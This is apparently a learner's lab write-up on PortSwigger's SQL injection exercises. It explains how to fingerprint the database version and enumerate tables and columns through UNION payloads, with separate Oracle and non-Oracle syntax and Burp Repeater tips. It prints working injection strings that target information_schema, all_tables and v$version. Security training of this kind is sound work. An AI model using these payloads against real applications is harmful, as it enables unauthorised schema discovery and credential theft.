# Day 4 — SQL injection: examining the database

Step 3 of a UNION attack assumes I already know the table and column names. In the
Day 3 labs PortSwigger gave them to me. In a real test nobody does. This day is about
finding them myself, and about the fact that the syntax changes with the database.

## First: which database is it?
Before anything else I want the database type and version, because every later step
(catalog names, string functions, comments) depends on it. The version string also
tells an attacker which known CVEs might apply to that exact build.

Each database reads its version differently:

| Database            | Version query                          |
|---------------------|----------------------------------------|
| Microsoft / MySQL   | `SELECT @@version`                     |
| Oracle              | `SELECT banner FROM v$version`         |
| PostgreSQL          | `SELECT version()`                     |

Dropped into a UNION (version goes in a text column):

    ' UNION SELECT @@version, NULL-- -              (MySQL / Microsoft)
    ' UNION SELECT banner, NULL FROM v$version-- -  (Oracle)

## Then: list the tables and columns
Most databases keep a built-in catalog that describes every other table and column.
I read it with the same UNION technique.

**Non-Oracle (MySQL, Microsoft, PostgreSQL)** — `information_schema`:

    -- all table names
    ' UNION SELECT table_name, NULL FROM information_schema.tables-- -

    -- columns of one table
    ' UNION SELECT column_name, NULL FROM information_schema.columns
      WHERE table_name = 'users_abcde'-- -

**Oracle** — has no `information_schema`, uses its own views:

    -- all table names
    ' UNION SELECT table_name, NULL FROM all_tables-- -

    -- columns of one table
    ' UNION SELECT column_name, NULL FROM all_tab_columns
      WHERE table_name = 'USERS_ABCDE'-- -

## The Oracle vs non-Oracle translator
Same attack, different words. This is the table worth memorising:

| What I want            | Non-Oracle               | Oracle               |
|------------------------|--------------------------|----------------------|
| List tables            | `information_schema.tables` | `all_tables`       |
| List columns           | `information_schema.columns`| `all_tab_columns` |
| Column holding names   | `table_name` / `column_name` | same             |
| Dummy table for SELECT | not needed               | `FROM dual`          |
| Version                | `@@version`              | `v$version` (banner) |

Two Oracle quirks that cost me time:
- **Every SELECT needs a FROM.** `' UNION SELECT NULL, NULL--` errors with 500 until I
  add `FROM dual` while counting columns. Once I read from a real view (`all_tables`)
  the FROM is already there.
- **Table and column names are UPPERCASE.** `all_tables` returns `USERS_KMLPCE`, not
  `users_kmlpce`. The `WHERE table_name = '...'` must match the case exactly.

## The MySQL comment trap
In MySQL `--` is only a comment if a space (or a control character) follows it.
A bare `--` at the end of the URL does nothing and the query breaks. Use one of:

    -- -        (dash, space, dash)
    #           (URL-encoded as %23)

## Finding the real table in the noise
`information_schema.tables` and especially Oracle's `all_tables` return hundreds of
**system** tables (`pg_...`, `SDO_...`, `DR$...`, `APP_USERS_AND_ROLES`, `DUAL`...).
The lab's real table is one random name among them, e.g. `users_iqibvh` / `USERS_KMLPCE`.
Do not scroll by hand. In Burp Repeater use the Response **Search** box and type
`USERS` / `users_`, then step through the matches. Ignore the system tables that merely
contain the word (like `APP_USERS_AND_ROLES`); the target has a random suffix.

## Why this matters
Steps 1–3 of Day 3 were the mechanics. This is the part that makes SQLi actually
dangerous in the wild: with `information_schema` / `all_tables` I need **zero prior
knowledge** of the schema. The database describes itself, I read the users table, and
I log in as administrator. No guessing.

## Key takeaway
A UNION attack in the real world is: find the database type → read its catalog to get
table and column names → read the data. The three UNION steps stay the same; only the
catalog names and syntax change per database.
